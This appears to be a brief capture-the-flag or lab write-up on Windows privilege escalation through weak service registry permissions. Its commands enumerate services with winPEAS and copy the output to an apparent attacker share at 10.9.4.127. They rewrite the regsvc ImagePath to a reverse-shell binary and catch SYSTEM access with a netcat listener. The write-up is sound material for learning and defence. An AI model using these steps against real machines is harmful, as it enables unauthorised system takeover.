1x3 Service - Weak Registry Permissions

## Service - Registry

```bash
.\winPEASany.exe ansi quiet servicesinfo > wpeas_services_op.txt
copy C:\PrivEsc\wpeas_services_op.txt \\10.9.4.127\kali\wpeas_services_op.txt
cat wpeas_services_op.txt
```
Identified 1 service mis-configuration

![6c3a14d4ac28104f6cf400dfb225c763.png](../_resources/b180268cdc9b41458a9a41407031812b.png)

```bash
sc qc regsvc
```
![516648b196b8c83350fdab2f9ee311ef.png](../_resources/3f9e64e76f884359a9571074578f6362.png)

```bash
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
![6007d58ab2d74e4afe4f39427ba86e61.png](../_resources/4b3c9c9f279f4b64be8606181be4d571.png)

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

![4c902045c0231755885a69dd377ec689.png](../_resources/012fe1dd9331492094be21dfd828529a.png)

```bash
sudo nc -nvlp 53
net start regsvc
```
![b8d0f2bb99b165a3d0d1dde3fde713cf.png](../_resources/812ba1fcc4a745f48d08833ea0f2da3e.png)

**Got the System**

![1b3603364baa33778c0894cc89307305.png](../_resources/8d0bf2519f054059b93ae7554651180c.png)

